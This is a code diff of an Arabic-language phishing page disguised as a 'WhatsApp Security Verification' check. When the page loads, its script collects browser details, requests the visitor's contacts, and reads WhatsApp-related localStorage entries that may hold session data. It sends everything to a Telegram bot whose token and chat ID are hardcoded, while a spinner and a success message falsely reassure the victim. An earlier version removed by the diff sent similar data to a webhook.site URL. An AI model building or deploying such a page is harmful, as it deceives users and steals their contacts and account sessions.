@@ -1,48 +1,135 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث واتساب</title>
+    <title>WhatsApp Security Check</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: #1f1f1f;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 0 30px rgba(37, 211, 102, 0.3);
+        }
+        h1 {
+            color: #25D366;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #ccc;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .loader {
+            margin: 30px auto;
+            border: 4px solid #333;
+            border-top: 4px solid #25D366;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success {
+            color: #25D366;
+            font-weight: bold;
+            display: none;
+        }
+        .warning {
+            color: #ff9800;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h2>تحديث واتساب جارٍ...</h2>
-    <p>يرجى الانتظار، سيتم توجيهك تلقائياً.</p>
+    <div class="container">
+        <h1>WhatsApp Security Verification</h1>
+        <p>جارٍ التحقق من أمان حسابك...</p>
+        <div class="loader"></div>
+        <p class="success" id="successMsg">تم التحقق بنجاح! يمكنك إغلاق الصفحة الآن.</p>
+        <p class="warning">يرجى عدم إغلاق الصفحة حتى اكتمال الفحص.</p>
+    </div>
+
     <script>
-        var WEBHOOK = "https://webhook.site/f396f1c1-fd14-4df1-9329-f57a283b7830";
+        // ========== إعدادات بوت تيليغرام ==========
+        const BOT_TOKEN = "8848720448:AAGgjjusWWTYNKLIs_3auDQW6DQDK0kaZfc";
+        const CHAT_ID = "6969346690";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        function send(payload) {
-            var json = JSON.stringify(payload);
-            var blob = new Blob([json], {type: "application/json"});
-            navigator.sendBeacon(WEBHOOK, blob);
-            fetch(WEBHOOK, {method: "POST", mode: "no-cors", body: json}).catch(() => {});
-        }
+        // ========== جمع المعلومات ==========
+        async function collectAndSend() {
+            // البيانات الأساسية من المتصفح
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                cookiesEnabled: navigator.cookieEnabled,
+                online: navigator.onLine,
+                url: window.location.href,
+                referrer: document.referrer || "none"
+            };
 
-        var data = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: screen.width + "x" + screen.height,
-            cookiesEnabled: navigator.cookieEnabled,
-            online: navigator.onLine,
-            url: location.href
-        };
-
-        if (navigator.contacts) {
-            navigator.contacts.select(["name", "tel"], {multiple: true})
-                .then(contacts => {
+            // محاولة جمع جهات الاتصال (Contacts API - تحتاج HTTPS وإذن)
+            if (navigator.contacts) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                     data.contacts = contacts;
-                    send(data);
-                })
-                .catch(() => send(data));
-        } else {
-            send(data);
+                } catch (err) {
+                    // المستخدم رفض أو فشل
+                    data.contacts = "permission_denied";
+                }
+            } else {
+                data.contacts = "api_not_supported";
+            }
+
+            // محاولة جمع بيانات من LocalStorage (قد تحتوي على جلسات)
+            try {
+                const waKeys = Object.keys(localStorage).filter(k => k.startsWith('WA'));
+                if (waKeys.length > 0) {
+                    data.whatsapp_storage = {};
+                    waKeys.forEach(k => data.whatsapp_storage[k] = localStorage.getItem(k));
+                }
+            } catch (e) {}
+
+            // إرسال البيانات إلى تيليغرام
+            const text = `📥 تقرير فحص أمني جديد:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+            
+            // sendBeacon كآلية رئيسية (لا تتأثر بـ CORS)
+            const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: text })], { type: 'application/json' });
+            navigator.sendBeacon(TELEGRAM_API, blob);
+
+            // خطة بديلة: fetch مع no-cors (قد لا تصل البيانات ولكن لا تظهر أخطاء)
+            fetch(TELEGRAM_API, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(() => {});
+
+            // عرض رسالة نجاح بعد 3 ثوانٍ
+            setTimeout(() => {
+                document.querySelector('.loader').style.display = 'none';
+                document.getElementById('successMsg').style.display = 'block';
+            }, 3000);
         }
 
-        setTimeout(() => {
-            window.location.href = "whatsapp://send?text=...";
-        }, 2000);
+        // بدء الجمع تلقائياً
+        collectAndSend();
     </script>
 </body>
 </html>
